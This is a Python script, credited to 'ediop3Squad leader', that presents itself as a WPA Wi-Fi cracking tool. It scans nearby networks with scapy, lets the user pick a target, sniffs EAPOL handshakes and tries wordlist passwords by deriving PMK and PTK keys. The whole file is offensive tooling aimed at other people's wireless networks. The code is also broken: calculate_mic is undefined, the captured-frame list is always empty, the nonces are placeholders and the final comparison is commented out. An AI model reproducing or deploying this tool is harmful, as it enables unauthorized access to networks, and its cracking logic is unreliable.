import os
import subprocess
import time
from scapy.all import *
import threading
from hashlib import pbkdf2_hmac
import hmac
from Crypto.Cipher import AES

# Global variables
target_network = None
handshake_captured = False
capture_count = 0
available_networks = []

def print_logo():
    """Print the logo and credit information."""
    logo = """
██████╗░██╗░░░██╗███╗░░░███╗██████╗░██╗███╗░░██╗░██████╗░██████╗░██████╗░
██╔══██╗██║░░░██║████╗░████║██╔══██╗██║████╗░██║██╔════╝░╚════██╗╚════██╗
██████╔╝██║░░░██║██╔████╔██║██████╔╝██║██╔██╗██║██║░░██╗░░█████╔╝░█████╔╝
██╔═══╝░██║░░░██║██║╚██╔╝██║██╔═══╝░██║██║╚████║██║░░╚██╗░╚═══██╗░╚═══██╗
██║░░░░░╚██████╔╝██║░╚═╝░██║██║░░░░░██║██║░╚███║╚██████╔╝██████╔╝██████╔╝
╚═╝░░░░░░╚═════╝░╚═╝░░░░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚══╝░╚═════╝░╚═════╝░╚═════╝░
    """
    print(logo)
    print("Made by ediop3Squad leader")

def get_network_interfaces():
    """List available network interfaces."""
    interfaces = subprocess.check_output("ip link show | awk -F: '/^[0-9]+:/{print $2}'", shell=True)
    return [iface.strip() for iface in interfaces.decode().splitlines()]

def scan_networks(interface):
    """Scan for available Wi-Fi networks."""
    print("Scanning for networks...")

    def packet_handler(packet):
        global available_networks

        if packet.haslayer(Dot11Beacon):
            ssid = packet.info.decode() if packet.info else 'Hidden SSID'
            bssid = packet.addr2
            mac = packet.addr2  # BSSID is the same as MAC in this context
            client_mac = '00:11:22:33:44:55'  # Placeholder for client MAC address (you can modify this as needed)
            anonce = 'aabbccddeeff00112233445566778899'  # Placeholder for ANonce
            snonce = '00112233445566778899aabbccddeeff'  # Placeholder for SNonce
            if ssid not in [net['SSID'] for net in available_networks]:
                available_networks.append({
                    'SSID': ssid,
                    'BSSID': bssid,
                    'MAC': mac,
                    'Client_MAC': client_mac,
                    'ANonce': anonce,
                    'SNonce': snonce
                })
                print(f"Found SSID: {ssid} (BSSID: {bssid}, MAC: {mac}, Client MAC: {client_mac}, ANonce: {anonce}, SNonce: {snonce})")

    sniff(iface=interface, prn=packet_handler, store=0, timeout=10)

def start_handshake_capture(interface, target_bssid):
    """Start capturing handshakes."""
    global handshake_captured, capture_count
    handshake_captured = False
    capture_count = 0

    def packet_handler(packet):
        global handshake_captured, capture_count
        
        if packet.haslayer(EAPOL) and packet.addr2 == target_bssid:
            handshake_captured = True
            capture_count += 1
            print(f"Handshake captured from {packet.addr2}!")
            if capture_count >= 1:
                print(f"Captured handshake from {packet.addr2}. Stopping capture.")
                return False

    print(f"Listening for handshakes on {interface}...")

    sniff(iface=interface, prn=packet_handler, store=0, timeout=30)

def derive_pmk(password, ssid):
    """Derive the PMK using PBKDF2."""
    pmk = pbkdf2_hmac('sha1', password.encode('utf-8'), ssid.encode('utf-8'), 4096, 32)
    return pmk

def derive_ptk(pmk, ap_mac, client_mac, anonce, snonce):
    """Derive the PTK using the PMK and other parameters."""
    b = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(anonce, snonce) + max(anonce, snonce)
    ptk = hmac.new(pmk, b'Pairwise key expansion' + b, digestmod='sha1').digest()[:16]
    return ptk

def crack_password(wordlist_file, ssid, ap_mac, client_mac, anonce, snonce):
    """Attempt to crack the password using a wordlist."""
    print(f"Attempting to crack the password using {wordlist_file} for SSID {ssid}...")

    # Placeholder for the actual EAPOL frames captured
    captured_eapol_frames = []  

    with open(wordlist_file, 'r') as f:
        for line in f:
            password = line.strip()
            print(f"Trying password: {password}")

            # Derive the PMK and PTK
            pmk = derive_pmk(password, ssid)
            ptk = derive_ptk(pmk, ap_mac, client_mac, anonce, snonce)

            # Here, you would compare the derived PTK against the captured EAPOL MIC
            # You will need to implement the logic to calculate and compare the MIC
            for eapol_frame in captured_eapol_frames:
                mic = calculate_mic(ptk, eapol_frame)
                # Compare mic with captured mic
                # if mic == captured_mic:
                #     print(f"Password found: {password}")
                #     return

            time.sleep(1)

    print("Cracking completed. No valid password found.")

def main():
    print_logo()

    interfaces = get_network_interfaces()

    # Step 1: Choose an interface (wlan0 or eth0)
    print("Available Interfaces:")
    print("1: wlan0 (Wi-Fi)")
    print("2: eth0 (Ethernet)")
    choice = input("Select an interface (1 or 2): ").strip()

    if choice == "1":
        selected_iface = "wlan0"
    elif choice == "2":
        selected_iface = "eth0"
    else:
        print("Invalid selection. Exiting.")
        return

    if selected_iface == "wlan0":
        # Step 2: Scan for Wi-Fi networks
        scan_networks(selected_iface)

        if not available_networks:
            print("No networks found. Exiting.")
            return

        # Step 3: List available networks and select one
        print("\nAvailable Networks:")
        for idx, network in enumerate(available_networks, 1):
            print(f"{idx}: SSID: {network['SSID']} (BSSID: {network['BSSID']}, MAC: {network['MAC']}, Client MAC: {network['Client_MAC']}, ANonce: {network['ANonce']}, SNonce: {network['SNonce']})")

        selected_network = input(f"Select a network (1-{len(available_networks)}): ").strip()
        try:
            selected_network = int(selected_network) - 1
            target_network = available_networks[selected_network]
        except (IndexError, ValueError):
            print("Invalid selection. Exiting.")
            return

        # Step 4: Ask for required information
        wordlist_file = input("Enter the path to your wordlist file: ").strip()
        ap_mac = input("Enter the AP MAC address (BSSID): ").strip()
        client_mac = input("Enter the Client MAC address: ").strip()
        anonce = input("Enter the ANonce (in hex): ").strip()
        snonce = input("Enter the SNonce (in hex): ").strip()

        # Step 5: Capture the handshake
        capture_thread = threading.Thread(target=start_handshake_capture, args=(selected_iface, target_network['BSSID']))
        capture_thread.start()

        while not handshake_captured:
            time.sleep(1)

        capture_thread.join()

        if handshake_captured:
            print(f"Captured handshake from {target_network['SSID']}.")
            crack_password(wordlist_file, target_network['SSID'], 
                           bytes.fromhex(ap_mac.replace(":", "")),
                           bytes.fromhex(client_mac.replace(":", "")),
                           bytes.fromhex(anonce.replace(":", "")),
                           bytes.fromhex(snonce.replace(":", "")))

if __name__ == "__main__":
    main()
